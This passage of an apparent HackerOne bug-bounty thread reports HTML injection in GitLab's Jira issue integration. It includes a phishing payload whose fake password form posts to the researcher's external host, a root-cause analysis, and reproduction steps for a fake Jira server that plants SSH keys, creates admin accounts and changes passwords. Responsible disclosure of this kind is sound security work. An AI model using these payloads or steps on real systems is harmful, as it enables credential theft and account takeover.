          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ldak7z22g01yqv5729xeg13hfb0e?response-content-disposition=attachment%3B%20filename%3D%22takeover.mp4%22%3B%20filename%2A%3DUTF-8%27%27takeover.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=86f354f615bdd29fe5580eab6d20a07ba4b19c04d5fa497e131a6a5e8d335c0f"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16201922,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "And finally. A small phishing POC. The text in this popup is related to pipelines, but you get the concept! One would just change the text to something more related to Jira. The text is generated by the CSS file, that's why I did not bother to change it :)\n\nIt tries to mimic \"merge request approval\" popups, which are a real thing in GitLab\n\npayload\n```\n<div id=\"u\"><form action=\"https://joaxcar.com\" method=\"POST\"><div></div><div><input placeholder=\"Password\" type=\"password\" name=\"x\"></div><div><button>Approve<style>@import \"/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css\"\n```\n\n{F1684031}",
      "automated_response": false,
      "created_at": "2022-04-07T20:44:30.448Z",
      "updated_at": "2022-04-07T20:44:53.552Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1684031,
          "filename": "phishing.jpg",
          "type": "image/jpeg",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y55nomf8xwbpeu0w8dmsfzorayjv?response-content-disposition=attachment%3B%20filename%3D%22phishing.jpg%22%3B%20filename%2A%3DUTF-8%27%27phishing.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fc86c8f1cc5108239449435ba6dee8cd03a42aab95ad112e3dabff4f24acfea5"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16204349,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I think that I have located the root of this issue.\n\nThe Jira issue details page is just reusing the base `issuable/show` Vue component [link](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/vue_shared/issuable/show/components). This component renders the title of the `issue` in the file [/app/assets/javascripts/vue_shared/issuable/show/components/issuable_title.vue](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/vue_shared/issuable/show/components/issuable_title.vue).\n\nThe lines responsible for displaying the title looks like this\n```ruby\n      <h1\n        v-safe-html=\"issuable.titleHtml || issuable.title\"\n        class=\"title qa-title\"\n        dir=\"auto\"\n        data-testid=\"title\"\n      ></h1>\n```\n\nThe interesting part is line 2 in this listing. This works great for regular `issuables` that always stores unescaped content in `title` and escaped content in `titleHtml`. The issue is how the task data from Jira is mapped to a GitLab `issuable`. This happens in [/ee/app/serializers/integrations/jira_serializers/issue_entity.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/serializers/integrations/jira_serializers/issue_entity.rb). Here the `title` of the new `issuable` is mapped directly from the Jira `summary` without encoding\n```ruby\n      expose :title do |jira_issue|\n        jira_issue.summary\n      end\n```\nAs no `titleHtml` is generated the unencoded `title` will be used in the Vue file.\n\nAs an example the other issue integration [ZenTao](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/serializers/integrations/zentao_serializers/issue_entity.rb) does this in its mapping\n```ruby\n      expose :title do |item|\n        sanitize(item['title'])\n      end\n```\nHere the `title` is sanitized and thus not vulnerable\n\nHope this can help to mitigate the issue!\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2022-04-08T07:14:03.447Z",
      "updated_at": "2022-04-08T07:14:03.447Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16234772,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I have found a small escalation of the reported issue. Now allowing for true arbitrary POST request and \"safe\" HTML injection. Bypassing the initial limitation of 255 characters. And making the POC and attack a lot easier to reproduce.\n\n## Unlimited injection\nAs it turns out there is really no check that the endpoint registered as the JIRA server is actually a JIRA server (might be hard to check anyway). And the limitation of 255 characters was enforced by JIRAs service. It appears that this limitation does not exist on the GitLab side on the JIRA issue model. Hence, we can fake a JIRA server by just serving up correct JSON as a response to the API request from GitLabs backend when a user asks to view a JIRA issue.\n\nWhen a user visits a link such as https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISSUE-1 on a project which have enabled JIRA issues, there is a request made from the backend to this endpoint\n\n```\nhttps://JIRASERVER/rest/api/2/issue/ISSUE-1?&expand=renderedFields\n```\n\nwhere JIRASERVER is the server configured in the projects `integrations`. A real JIRA server gives quite a verbose answer to this request, and some parts of this answer is subsequently mapping the result to an `issuable`.\n\nBy setting up a server responding with a similar request the attacker can generate responses with an arbitrary long payload in the \"summary\" field, used as title in GilLab.\n\nI will attach a sample JSON response to this posting, but you can also view it here: https://joaxcar.com/resth/test4.json\nSearch for \"summary\" in the JSON data to see the payload\n\n## Better attack\nFirst of this opens up for full control over the attack for the attacker. As length is no longer a problem, ALL post requests are now possible. There is also no limit on the amount of injected tags or styling. This also opens up for a \"Stacked POST requests\" attack as I have described in an earlier report where the infected page can be made to perform a series of POST requests by stacking full page links on top of each other. I will have a POC of this further down. If the user makes 4 clicks on the page, there will be 3 POST requests made with different payloads\n\nThe ability to serve any response to the request from GitLab also allows the attacker to make the payload dynamic. The \"SSH KEY\" planting attack described in my report 1409788 can thus be made to never serve the same SSH key twice. If two users visits the same malicious page they will have two different KEYs in their respective payload!\n\n## POC\nTo take advantage of this new improved attack for testing you can use my server. Steps:\n\n1. Log in as the attacker\n2. Create a project (with premium enabled) \n3. Go to /-/integrations/jira/edit\n4. Fill in server: `https://joaxcar.com` , username and password can be whatever\n5. Click \"enable JIRA issues\"\n6. Now go to any of the following links (replace group and project name):\n\nhttps://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER1\n\nhttps://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER2\n\nhttps://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER3\n\nhttps://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER4\n\nHACKER1 - add SSH key\nHACKER2 - create admin account\nHACKER3 - change user password\nHACKER4 - All three from above. Click 4 times\n\nAll attacks work on all GitLab instances, as all links are without root path in the payloads.\n\nThe SSH Key attack will add a valid SSH key to your account. To be able to reuse the POC you have to go to\n\nhttps://gitlab.com/-/profile/keys\n\nand remove the key named Hacker when done testing. The key can only exist on one account at the time. And I have not made my server generate dynamic SSH keys for this POC.\n\n## Conclusion\nThe attack is now without payload limit and way easier to reproduce. I don't know if this is enough to lower attack complexity from HIGH to LOW. Your CVSS calculator states for HIGH\n\n>   Knowledge of a private project name is required to carry out the attack\n>   A certain setting has to have a non-default value to make the attack possible\n>   Exploitation depends on a specific timing and cannot always be reproduced \n\nI guess it is the last one that matters, as the first ones are not applicable. As the attack works now, there is no dependency on timing or other limitations, apart from the limitation that the victim needs to perform more than one click (minimum 2 for successful attack). And that all payloads are not effective against all users. The SSH attack works on all users 100% success rate, the password account takeover is effective on users that have not set a password, and the admin attack is only viable against admins. But then there is multiple more attacks that are possible, like payloads targeted at making specific projects public, inviting users to private projects and so on.\n\nIf you need any more information please just reach out!\n\nBest regards\nJohan\n\nEdit. My server have these rewrite rules for requests:\n```\nRewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK1\nRewriteRule .* https://joaxcar.com/resth/test.json [L,R=302]\nRewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK2\nRewriteRule .* https://joaxcar.com/resth/test2.json [L,R=302]\nRewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK3\nRewriteRule .* https://joaxcar.com/resth/test3.json [L,R=302]\nRewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK4\nRewriteRule .* https://joaxcar.com/resth/test4.json [L,R=302]\n```",
      "automated_response": false,
      "created_at": "2022-04-11T09:55:42.738Z",
      "updated_at": "2022-04-11T10:01:11.488Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1687943,
          "filename": "data_example.json",
          "type": "application/json",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/g8unqy8jwhmees067tgjcvezr60y?response-content-disposition=attachment%3B%20filename%3D%22data_example.json%22%3B%20filename%2A%3DUTF-8%27%27data_example.json&response-content-type=application%2Fjson&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0d37158595cd52b1842f56bdbb9c626ebeda1e85c0f0c7e3e512a284e072054b"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16246021,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @joaxcar,\n\nI was looking at your other report just now and realized I never mentioned that we already reviewed this report.\n\nWe reviewed this report and forwarded this to the GitLab team on Friday and will provide you with an update whenever possible.\n\nThanks,\n@long_cat",
      "automated_response": false,
      "created_at": "2022-04-11T22:47:18.907Z",
      "updated_at": "2022-04-11T22:47:18.907Z",
      "actor": {
        "username": "h1_analyst_kenny",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_kenny",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/km1cnxeipy9i2ds59qd7i14jr1gf/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16247595,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the update @long_cat ! Sounds great\n\nBest regards\nJohsn",
      "automated_response": false,
      "created_at": "2022-04-12T06:04:54.429Z",
      "updated_at": "2022-04-12T06:04:54.429Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
